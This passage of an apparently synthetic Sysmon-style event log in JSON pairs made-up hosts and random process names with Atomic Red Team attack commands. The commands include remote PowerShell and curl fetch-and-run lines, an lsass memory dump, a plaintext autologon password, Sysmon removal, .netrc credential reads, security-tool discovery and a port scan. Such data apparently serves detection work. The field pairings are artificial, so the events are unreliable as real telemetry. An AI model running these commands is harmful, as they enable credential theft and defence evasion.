        "SourceImage": "C:\\Users\\Public\\poor..exe",
        "DestinationProcessID": 6533,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Windows\\plan..exe",
        "UtcTime": "2024-05-17T01:36:51.821005Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-38.rose.org",
        "User": "daniel33",
        "ProcessID": 5227,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"$VM = \\\"#{vm_name}\\\"\\nNew-VM -Name $VM -Generation 2\\nSet-VMFirmware $VM -EnableSecureBoot Off\\nStart-VM $VM\",",
        "LogonID": 682924,
        "LogonGuid": "228eba82-04aa-4b4a-b60a-5386fdd6b797",
        "SourceProcessID": 2549,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\left..dll",
        "DestinationProcessID": 6851,
        "DestinationProcessName": "malware.exe",
        "DestinationImage": "C:\\Windows\\factor..exe",
        "UtcTime": "2024-05-17T01:36:51.821005Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "web-37.hernandez.biz",
        "User": "mark56",
        "ProcessID": 5495,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nNew-Item -Type Directory \\\"PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\\\\" -ErrorAction Ignore -Force | Out-Null\\ntry{ IEX (IWR 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1003.001/src/Out-Minidump.ps1') -ErrorAction Stop}\\ncatch{ $_; exit $_.Exception.Response.StatusCode.Value__}\\nget-process lsass | Out-Minidump\\n\",",
        "LogonID": 864251,
        "LogonGuid": "2828fbd6-a687-415c-b91d-1033e1c2465d",
        "SourceProcessID": 8883,
        "SourceProcessName": "mimikatz.exe",
        "SourceImage": "C:\\Program Files\\use..exe",
        "DestinationProcessID": 2740,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\window..dll",
        "UtcTime": "2024-05-17T01:36:51.822513Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "desktop-08.kelly.com",
        "User": "meganmiller",
        "ProcessID": 1446,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"import -window root #{output_file}\\n\",",
        "LogonID": 883076,
        "LogonGuid": "0ea3f30d-84e3-49a2-9e40-453c5ed9ac90",
        "SourceProcessID": 2137,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\daughter..exe",
        "DestinationProcessID": 6250,
        "DestinationProcessName": "backdoor.exe",
        "DestinationImage": "C:\\Program Files\\read..dll",
        "UtcTime": "2024-05-17T01:36:51.822513Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-15.wilson-long.com",
        "User": "stephaniehodges",
        "ProcessID": 1293,
        "ProcessName": "taskmgr.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\System\\\\CurrentControlSet\\\\Control\\\\Terminal Server\\\" /v fSingleSessionPerUser /t REG_DWORD /d 0 /f\\n\",",
        "LogonID": 955855,
        "LogonGuid": "001cef5e-eb66-4339-8dc5-0d6097954f36",
        "SourceProcessID": 4764,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Users\\Public\\kind..dll",
        "DestinationProcessID": 7270,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\order..exe",
        "UtcTime": "2024-05-17T01:36:51.822513Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "email-53.hall.com",
        "User": "wheelersamantha",
        "ProcessID": 5226,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"reg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" /v AutoAdminLogon /t REG_DWORD /d 1 /f\\nreg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" /v DefaultUserName /t REG_SZ /d Administrator /f\\nreg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" /v DefaultDomainName /t REG_SZ /d contoso.com /f\\nreg add \\\"HKLM\\\\Software\\\\Policies\\\\Microsoft\\\\Windows NT\\\\CurrentVersion\\\\Winlogon\\\" /v DefaultPassword /t REG_SZ /d password1 /f\\n\",",
        "LogonID": 226779,
        "LogonGuid": "dd2b231e-7c64-4eb2-b3a2-cacf0e8cb74c",
        "SourceProcessID": 7106,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Users\\Public\\vote..dll",
        "DestinationProcessID": 8873,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Windows\\born..dll",
        "UtcTime": "2024-05-17T01:36:51.822513Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-73.fisher-ward.info",
        "User": "josephcunningham",
        "ProcessID": 7253,
        "ProcessName": "nc.exe",
        "CommandLine": "\"kldstat | grep -i \\\"vmm\\\"\\nkldstat | grep -i \\\"vbox\\\"\\n\",",
        "LogonID": 312421,
        "LogonGuid": "b6fbf738-7cce-444e-96bd-2c141bd1c410",
        "SourceProcessID": 2253,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\enter..dll",
        "DestinationProcessID": 3186,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Windows\\agent..exe",
        "UtcTime": "2024-05-17T01:36:51.823523Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "lt-89.mitchell.net",
        "User": "danielle56",
        "ProcessID": 8381,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"ps aux | egrep 'Little\\\\ Snitch|CbOsxSensorService|falcond|nessusd|santad|CbDefense|td-agent|packetbeat|filebeat|auditbeat|osqueryd|BlockBlock|LuLu'\\n\",",
        "LogonID": 649249,
        "LogonGuid": "9421dcc8-57b2-4627-a822-05bd480fcbff",
        "SourceProcessID": 2319,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\relationship..exe",
        "DestinationProcessID": 4297,
        "DestinationProcessName": "powershell.exe",
        "DestinationImage": "C:\\Program Files\\miss..dll",
        "UtcTime": "2024-05-17T01:36:51.823523Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "lt-94.barnett.info",
        "User": "bcrawford",
        "ProcessID": 8094,
        "ProcessName": "malware.exe",
        "CommandLine": "\"reg add \\\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Policies\\\\Explorer\\\" /v NoFileMenu /t REG_DWORD /d 1 /f\\n\",",
        "LogonID": 947236,
        "LogonGuid": "3b9356c6-6375-439a-90e8-38b681ee74f6",
        "SourceProcessID": 2075,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Windows\\three..exe",
        "DestinationProcessID": 1009,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\bill..dll",
        "UtcTime": "2024-05-17T01:36:51.823523Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "desktop-08.oconnor-smith.net",
        "User": "kelseywilson",
        "ProcessID": 9211,
        "ProcessName": "malware.exe",
        "CommandLine": "\"copy %windir%\\\\system32\\\\certutil.exe %temp%\\\\tcm.tmp\\n%temp%\\\\tcm.tmp -encode #{executable} %temp%\\\\T1140_calc2.txt\\n%temp%\\\\tcm.tmp -decode %temp%\\\\T1140_calc2.txt %temp%\\\\T1140_calc2_decoded.exe\\n\",",
        "LogonID": 869778,
        "LogonGuid": "c5342526-5330-4643-b1db-df5a52117ff5",
        "SourceProcessID": 4475,
        "SourceProcessName": "nc.exe",
        "SourceImage": "C:\\Users\\Public\\pattern..exe",
        "DestinationProcessID": 9238,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\keep..dll",
        "UtcTime": "2024-05-17T01:36:51.823523Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "srv-69.watkins.net",
        "User": "bdoyle",
        "ProcessID": 5122,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"aws iam create-user --user-name #{username}\\n\",",
        "LogonID": 311584,
        "LogonGuid": "db30dbfc-71d5-411b-89c9-b5c9546dc7d9",
        "SourceProcessID": 1627,
        "SourceProcessName": "backdoor.exe",
        "SourceImage": "C:\\Program Files\\success..dll",
        "DestinationProcessID": 7536,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\office..dll",
        "UtcTime": "2024-05-17T01:36:51.823523Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-52.schmidt.com",
        "User": "garciaandrew",
        "ProcessID": 5200,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"Import-Module -Name Az.Resources\\n$PWord = ConvertTo-SecureString -String \\\"#{password}\\\" -AsPlainText -Force\\n$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList \\\"#{username}\\\", $Pword\\nConnect-AzAccount -Credential $Credential\\n\\n$sp = Get-AzADServicePrincipal | where-object {$_.DisplayName -eq \\\"#{service_principal_name}\\\"}\\nif ($sp -eq $null) { Write-Warning \\\"Service Principal not found\\\"; exit }\\n$subscription = Get-AzSubscription | where-object {$_.Name -eq \\\"#{subscription}\\\"} \\nif ($subscription -eq $null) { Write-Warning \\\"Subscription not found\\\"; exit }\\n$role = Get-AzRoleDefinition | where-object {$_.Name -eq \\\"#{role_name}\\\"}\\nif ($role -eq $null) { Write-Warning \\\"Role not found\\\"; exit }\\n\\nNew-AzRoleAssignment -ObjectId $sp.id -RoleDefinitionId $role.id -Scope /subscriptions/$subscription\\nWrite-Host \\\"Service Principal $($sp.DisplayName) was added to $($role.Name) role in subscriptions $($subscriptions.Name)\\\"\\n\",",
        "LogonID": 765494,
        "LogonGuid": "17f46070-6d7e-410f-9cdd-baecf641e4af",
        "SourceProcessID": 9534,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Users\\Public\\brother..dll",
        "DestinationProcessID": 7227,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Program Files\\set..exe",
        "UtcTime": "2024-05-17T01:36:51.824522Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "laptop-44.mason.com",
        "User": "marisa53",
        "ProcessID": 9150,
        "ProcessName": "rundll32.exe",
        "CommandLine": "\"cat /etc/shells \\n\",",
        "LogonID": 206651,
        "LogonGuid": "cf3f2d24-ee43-4ba5-babd-6bb5d33c87cb",
        "SourceProcessID": 1644,
        "SourceProcessName": "regsvr32.exe",
        "SourceImage": "C:\\Users\\Public\\company..exe",
        "DestinationProcessID": 6476,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Program Files\\provide..exe",
        "UtcTime": "2024-05-17T01:36:51.824522Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-10.harrison-ibarra.net",
        "User": "ana33",
        "ProcessID": 7089,
        "ProcessName": "mimikatz.exe",
        "CommandLine": "\"sysmon -u\\n\",",
        "LogonID": 874179,
        "LogonGuid": "5ab5826d-7237-4c25-8d91-9e1497b35823",
        "SourceProcessID": 3566,
        "SourceProcessName": "powershell.exe",
        "SourceImage": "C:\\Program Files\\research..exe",
        "DestinationProcessID": 5545,
        "DestinationProcessName": "regsvr32.exe",
        "DestinationImage": "C:\\Program Files\\your..dll",
        "UtcTime": "2024-05-17T01:36:51.824522Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "desktop-46.wright.com",
        "User": "gfrench",
        "ProcessID": 7021,
        "ProcessName": "explorer.exe",
        "CommandLine": "\"sudo sed -i 's/Storage=auto/Storage=none/' /etc/systemd/journald.conf\\n\",",
        "LogonID": 130515,
        "LogonGuid": "c70c86c4-114b-4b15-a99c-6d17dc375c5a",
        "SourceProcessID": 2685,
        "SourceProcessName": "taskmgr.exe",
        "SourceImage": "C:\\Windows\\team..exe",
        "DestinationProcessID": 9349,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Users\\Public\\bed..exe",
        "UtcTime": "2024-05-17T01:36:51.824522Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-86.mathis.com",
        "User": "jcampos",
        "ProcessID": 1782,
        "ProcessName": "nc.exe",
        "CommandLine": "\"for file in $(find #{file_path} -type f -name .netrc 2> /dev/null);do echo $file ; cat $file ; done\\n\",",
        "LogonID": 573370,
        "LogonGuid": "812fd648-a65e-468c-a03d-d9c44563b3af",
        "SourceProcessID": 9619,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\mind..dll",
        "DestinationProcessID": 9453,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\task..exe",
        "UtcTime": "2024-05-17T01:36:51.824522Z"
    },
    {
        "EventID": 5,
        "EventType": "Process Terminate",
        "ComputerName": "db-75.sanders-abbott.com",
        "User": "charlesamy",
        "ProcessID": 2476,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"curl -s https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1074.001/src/Discovery.sh | sh -s > #{output_file}\\n\",",
        "LogonID": 577000,
        "LogonGuid": "b9e86234-4db5-4ae6-8b0b-5289da708a2e",
        "SourceProcessID": 2406,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Users\\Public\\note..dll",
        "DestinationProcessID": 6371,
        "DestinationProcessName": "rundll32.exe",
        "DestinationImage": "C:\\Users\\Public\\reveal..exe",
        "UtcTime": "2024-05-17T01:36:51.825521Z"
    },
    {
        "EventID": 7,
        "EventType": "Image Load",
        "ComputerName": "web-79.robles-dickerson.com",
        "User": "hunter80",
        "ProcessID": 9564,
        "ProcessName": "regsvr32.exe",
        "CommandLine": "\"mshta.exe \\\"about:<hta:application><script language=\\\"VBScript\\\">Close(Execute(\\\"CreateObject(\\\"\\\"Wscript.Shell\\\"\\\").Run%20\\\"\\\"powershell.exe%20-nop%20-Command%20Write-Host%20#{message};Start-Sleep%20-Seconds%20#{seconds_to_sleep}\\\"\\\"\\\"))</script>'\\\"\\n\",",
        "LogonID": 898243,
        "LogonGuid": "a9ae14d6-9f5d-48f5-be35-d31b98fb653a",
        "SourceProcessID": 3733,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Windows\\foot..exe",
        "DestinationProcessID": 2771,
        "DestinationProcessName": "mimikatz.exe",
        "DestinationImage": "C:\\Users\\Public\\agreement..dll",
        "UtcTime": "2024-05-17T01:36:51.825521Z"
    },
    {
        "EventID": 11,
        "EventType": "File Create",
        "ComputerName": "laptop-98.burton-mcgrath.com",
        "User": "humphreyyolanda",
        "ProcessID": 3446,
        "ProcessName": "cmd.exe",
        "CommandLine": "\"if [ \\\"$(uname)\\\" = 'FreeBSD' ]; then cmd=\\\"netstat -Sp tcp\\\"; else cmd=\\\"netstat -ant\\\"; fi;\\nif [ -x \\\"$(command -v arp)\\\" ]; then arp -a; else echo \\\"arp is missing from the machine. skipping...\\\"; fi;\\nif [ -x \\\"$(command -v ifconfig)\\\" ]; then ifconfig; else echo \\\"ifconfig is missing from the machine. skipping...\\\"; fi;\\nif [ -x \\\"$(command -v ip)\\\" ]; then ip addr; else echo \\\"ip is missing from the machine. skipping...\\\"; fi;\\nif [ -x \\\"$(command -v netstat)\\\" ]; then $cmd | awk '{print $NF}' | grep -v '[[:lower:]]' | sort | uniq -c; else echo \\\"netstat is missing from the machine. skipping...\\\"; fi;\\n\",",
        "LogonID": 782563,
        "LogonGuid": "33becc27-14e7-4924-a50c-4431e4345f24",
        "SourceProcessID": 6165,
        "SourceProcessName": "malware.exe",
        "SourceImage": "C:\\Users\\Public\\production..dll",
        "DestinationProcessID": 2996,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Windows\\moment..exe",
        "UtcTime": "2024-05-17T01:36:51.825521Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-91.moore.biz",
        "User": "npeterson",
        "ProcessID": 3353,
        "ProcessName": "backdoor.exe",
        "CommandLine": "\"pgrep -l 'bareos-fd|icinga2|cbagentd|wazuh-agent|packetbeat|filebeat|osqueryd'\\n\",",
        "LogonID": 977297,
        "LogonGuid": "5c886a1a-28b8-43e6-8ee6-de0eb6f2373d",
        "SourceProcessID": 7259,
        "SourceProcessName": "rundll32.exe",
        "SourceImage": "C:\\Program Files\\forward..dll",
        "DestinationProcessID": 2575,
        "DestinationProcessName": "nc.exe",
        "DestinationImage": "C:\\Users\\Public\\sign..dll",
        "UtcTime": "2024-05-17T01:36:51.825521Z"
    },
    {
        "EventID": 3,
        "EventType": "Network Connection",
        "ComputerName": "db-01.hansen.com",
        "User": "umelton",
        "ProcessID": 9011,
        "ProcessName": "malware.exe",
        "CommandLine": "\"for port in {1..65535}; do (2>/dev/null echo >/dev/tcp/#{host}/$port) && echo port $port is open ; done\\n\",",
        "LogonID": 217375,
        "LogonGuid": "e14f3ff1-ed8d-436b-ade4-57e794ebcbcc",
        "SourceProcessID": 3525,
        "SourceProcessName": "explorer.exe",
        "SourceImage": "C:\\Program Files\\fund..dll",
        "DestinationProcessID": 1493,
        "DestinationProcessName": "cmd.exe",
        "DestinationImage": "C:\\Program Files\\national..exe",
        "UtcTime": "2024-05-17T01:36:51.825521Z"
    },
    {
        "EventID": 1,
        "EventType": "Process Create",
        "ComputerName": "email-64.chambers-wade.com",
        "User": "browndaniel",
        "ProcessID": 1289,
        "ProcessName": "powershell.exe",
        "CommandLine": "\"[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\\nSet-Clipboard -value \\\"Atomic T1115 Test, grab data from clipboard via VBA\\\"\\nIEX (iwr \\\"https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\\\" -UseBasicParsing)\\nInvoke-Maldoc -macroFile \\\"PathToAtomicsFolder\\\\T1115\\\\src\\\\T1115-macrocode.txt\\\" -officeProduct \\\"Word\\\" -sub \\\"GetClipboard\\\"\\n\",",
        "LogonID": 740921,
        "LogonGuid": "4b1db6e3-5d5e-4b59-b3ea-aa6012b2929f",
        "SourceProcessID": 7714,
        "SourceProcessName": "cmd.exe",
        "SourceImage": "C:\\Program Files\\continue..exe",
        "DestinationProcessID": 2994,
        "DestinationProcessName": "explorer.exe",
        "DestinationImage": "C:\\Users\\Public\\reality..exe",
        "UtcTime": "2024-05-17T01:36:51.826522Z"
    },
